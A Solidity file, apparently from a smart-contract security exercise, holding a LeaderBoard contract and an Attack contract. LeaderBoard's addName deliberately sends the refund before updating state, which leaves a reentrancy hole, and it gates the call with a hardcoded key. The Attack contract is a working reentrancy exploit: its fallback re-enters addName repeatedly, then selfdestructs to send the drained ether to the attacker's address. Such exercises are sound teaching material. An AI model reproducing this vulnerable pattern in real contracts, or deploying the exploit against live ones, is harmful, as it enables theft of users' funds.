pragma solidity ^0.6.0;

contract LeaderBoard {
    mapping (address => bool) private status; //true if this is there first time to call add name
    mapping (address => uint) private numberOfNamesOnBoard; 
    mapping (address => address) private studentAliases; // Alias(know) -> newAddress(unknown) 
    
    
     /*
    * initialize(): allows to start and reset their status on the board. Called first.
    * @arg studentAlias - the main address that the student mainly uses.
    * @returns nothing
    */
    function initialize(address studentAlias) public{
        studentAliases[studentAlias] = msg.sender; // Alias(know) -> newAddress(unknown) Needed to view LeaderBoard
        status[msg.sender] = true;
        numberOfNamesOnBoard[msg.sender] = 0;
    }
    
    /*
    * getLeaderboardEntryByAlias(): allows anyone to get the value of a address by the known alias address.
    * @arg studentAlias - the main address that the student mainly uses.
    * @returns uint - the number of times your name is on the board.
    */
    function getLeaderboardEntryByAlias(address studentsAlias) view public returns(uint){
        return numberOfNamesOnBoard[studentAliases[studentsAlias]];
    }

    /*
    * getLeaderboardEntryByCaller(): allows anyone to get the value of a address by the unknown address.
    * @arg studentAlias - the unknown address that the student used to call the function.
    * @returns uint - the number of times your name is on the board.
    */
    function getLeaderboardEntryByCaller(address caller) view public returns(uint){
        return numberOfNamesOnBoard[caller];
    }

    /*
    * addName(): will add the students name to the board.
    * @arg key - the secret key that needs to be submitted to call the addName function
    * @returns nothing
    */
    function addName(uint key) public payable{ // forcing the students to pay us for the privilege to play.
        // checks that sender is new with status, checks if the key matches, checks if it was funded at least 1 ether,
        // adds the student 1 time, and then refunds the payment and marks sender as not-new.
        require(status[msg.sender], "error - Not the first time"); //Must be first time
        require(key == 1337, "error - Invalid key");
        require(msg.value >= 1 ether, "error - Not enough ether");
        
        (bool isSuccessfulTransfer,) = msg.sender.call.value(msg.value)(""); // refund
        
        numberOfNamesOnBoard[msg.sender] += 1;
        
        require(isSuccessfulTransfer, "error - Transfer unsuccessful");
        
        
        status[msg.sender] = false;
    }


    // Admin Functions


    /*
    * fund(): allows the additional funding of the smart contract easily. Anyone can call it.
    * @arg nothing
    * @returns nothing
    */
    function fund() public payable{ // allows admin to give some funds into the smart contract to cover the gas cost ~1 ether is good.
    }
}

contract Attack {
    address LB_ADDR = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
    address payable MY_ADDRESS = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    
    LeaderBoard board = LeaderBoard(LB_ADDR);
    constructor() public {
        board.initialize(MY_ADDRESS);
    }
    
    function startAttack() public payable{
        board.addName{value:1 ether}(1337);
    }
    
    fallback() external payable {
        if (board.getLeaderboardEntryByAlias(MY_ADDRESS) > 10) {
            
            // withdraw the refund
            selfdestruct(MY_ADDRESS);
            
            return;
        }
        board.addName{value:1 ether}(1337);
    }
    
    /*
    * fund(): allows the additional funding of the smart contract easily. Anyone can call it.
    * @arg nothing
    * @returns nothing
    */
    function fund() public payable{ // allows admin to give some funds into the smart contract to cover the gas cost ~1 ether is good.
    }
}
